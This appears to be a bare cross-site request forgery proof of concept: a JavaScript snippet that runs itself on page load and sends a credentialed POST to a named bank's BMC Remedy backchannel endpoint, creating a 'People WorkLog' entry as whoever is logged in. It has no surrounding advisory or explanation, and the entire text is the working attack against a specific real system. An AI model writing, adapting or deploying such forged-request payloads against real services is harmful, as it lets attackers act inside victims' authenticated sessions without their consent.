
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/sacombank.onbmc.com\/arsys\/web\/v1.0\/backchannel\/SetEntryList\/CTM:People%20WorkLog?timezone=Asia\/Saigon", true);
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
        xhr.setRequestHeader("Content-Type", "application\/json;charset=UTF-8");
        xhr.withCredentials = true;
        var body = "{\"currentServer\":\"onbmc-s\",\"currentSchema\":\"SHR:SV_TicketDisplay\",\"server\":\"onbmc-s\",\"schema\":\"CTM:People WorkLog\",\"curEntryId\":\"\",\"noMatchOpt\":4,\"multiMatchOpt\":6,\"likeId\":false,\"qualification\":\"\",\"qualFieldIds\":[],\"qualFieldValues\":[],\"qualFieldTypes\":[],\"fields\":[112,60900,304469201,1000000000,1000000076,1000000080,1000000151,1000000157,1000000170,1000000351,1000000352,1000000353,1000000761],\"fieldValues\":[\"\",\"\",\"AU\",\"\x3cp\x3ehiduong\x3c/p\x3e\",\"NEW\",\"PPL000000025277\",\"\x3cp\x3ehi\x3c/p\x3e\",1775029129,2000,\"\",\"\",\"\",1],\"fieldTypes\":[0,0,4,4,4,4,4,7,6,0,0,0,6],\"formNameToken\":\"Kh8JVA\"}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
 

